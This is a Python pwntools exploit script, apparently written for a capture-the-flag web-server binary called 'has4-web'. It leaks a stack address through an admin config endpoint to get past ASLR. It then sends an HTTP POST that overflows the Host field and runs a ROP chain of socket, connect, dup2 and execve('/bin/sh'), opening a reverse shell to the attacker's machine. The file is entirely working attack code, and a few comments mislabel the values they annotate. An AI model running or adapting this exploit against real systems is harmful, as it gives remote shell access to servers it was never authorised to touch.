#!/usr/bin/env python3
from pwn import *
from pwnlib.rop.ret2csu import p64
import subprocess
import json

context.arch = "amd64"
context.log_level = "INFO"


p = remote(args.IP , int(args.PORT))

# cURL ASLR Leak
config_addr = 'http://' + args.IP + '/!admin/config'
curl_command = ['curl', '-d', '{"dashboard": "get"}', '-H', 'Content-Type: application/json', config_addr]
result = subprocess.run(curl_command, capture_output=True, text=True)
print(result.stdout)
print(result.stderr)

# Get the leak out of string maddness
leak = int(json.loads(result.stdout)["Host OS"].split(" ")[-1])

if leak < 0:
    leak = leak + 2**32

# Compute Leaks
base_guess = leak + 0x1C0 + 0x20
binsh_guess = base_guess
ipaddr_guess = base_guess - 0x8

# Print Leaks for Debugging
print(f"Leak: {hex(leak)}")
print(f"/bin/sh: {hex(base_guess)}")
print(f"ipaddr: {hex(base_guess - 0x8)}")

# Gadget Collection
r = ROP("./has4-web")
pop_rdi = 0x40ffad
pop_rax = 0x40f5f9
pop_rsi = r.find_gadget(['pop rsi' ,'ret'])[0]
pop_rdx = r.find_gadget(['pop rdx', 'pop rbx' ,'ret'])[0] # Two values
syscall = 0x44b936

# Stack Address of ROP Chain
rop_addr = base_guess

# Build ROPChain
ropchain = b''

# Socket syscall #
ropchain += p64(pop_rdi)        # domain = AF_INET = 0
ropchain += p64(0x2)
ropchain += p64(pop_rax)        # socket syscall
ropchain += p64(0x29)
ropchain += p64(pop_rsi)        # type = SOCK_STREAM = 1
ropchain += p64(0x1)
ropchain += p64(pop_rdx)        # protocol = IPPROTO_IP = 0
ropchain += p64(0x0)
ropchain += p64(0xbeefbeef)     # populate rbx
ropchain += p64(syscall)        # open our socket

# Connect syscall #
ropchain += p64(pop_rdi)        # put socket in RDI
ropchain += p64(0x4)            # hardcoded socket num
ropchain += p64(pop_rsi)        #movabs rax, 0x201010101010101/push rax/movabs rax, 0x301017e5d100103/xor
ropchain += p64(rop_addr - 0x8) # This value needs to be an address (passed in before rop chain to prevent parsing)
ropchain += p64(pop_rax)        # syscall
ropchain += p64(0x2a)
ropchain += p64(pop_rdx)        # ????
ropchain += p64(0x10)
ropchain += p64(0xbeef2bab)     # Populate rbx
ropchain += p64(syscall)

# dup2 loop (put shell io to socket) #
ropchain += p64(pop_rdi)
ropchain += p64(0x4)            # Pass along socket

ropchain += p64(pop_rax)        # Reset syscall
ropchain += p64(0x21)
ropchain += p64(pop_rsi)        # Next buffer
ropchain += p64(0x2)
ropchain += p64(syscall)

ropchain += p64(pop_rax)        # Reset syscall
ropchain += p64(0x21)
ropchain += p64(pop_rsi)        # Next buffer
ropchain += p64(0x1)
ropchain += p64(syscall)

ropchain += p64(pop_rax)        # Reset syscall
ropchain += p64(0x21)
ropchain += p64(pop_rsi)        # Next buffer
ropchain += p64(0x0)
ropchain += p64(syscall)

# execve syscall #
ropchain += p64(pop_rdi)        # Prep binsh
ropchain += p64(rop_addr)       # Pointer to /bin/sh
ropchain += p64(pop_rsi)        # Null RSI
ropchain += p64(0x0)
ropchain += p64(pop_rdx)        # Null RDX
ropchain += p64(0x0)
ropchain += p64(0xbeef2bab)     # populate rbx
ropchain += p64(pop_rax)        # execve syscall
ropchain += p64(0x3b)               
ropchain += p64(syscall)

# Use leave gadget to cause RBP to take over stack and point to ropchain
chain = cyclic(336) + rop_addr.to_bytes(6, "little") + b'\x00\x00'

# Build request, add in our two addesses to the unparsed "Accept" field
# The first p64() is the ip address for listen()
post = b"POST / HTTP/1.1\r\nHost:  " + chain + b"\r\n\
    If-Modified-Since:\r\n\
    Accept: " + p64(0x5c110002) + b"/bin/sh\0" + ropchain + b"\r\n\
    AB=C\r\n\r\n"

# Send post and get shell
p.sendline(post)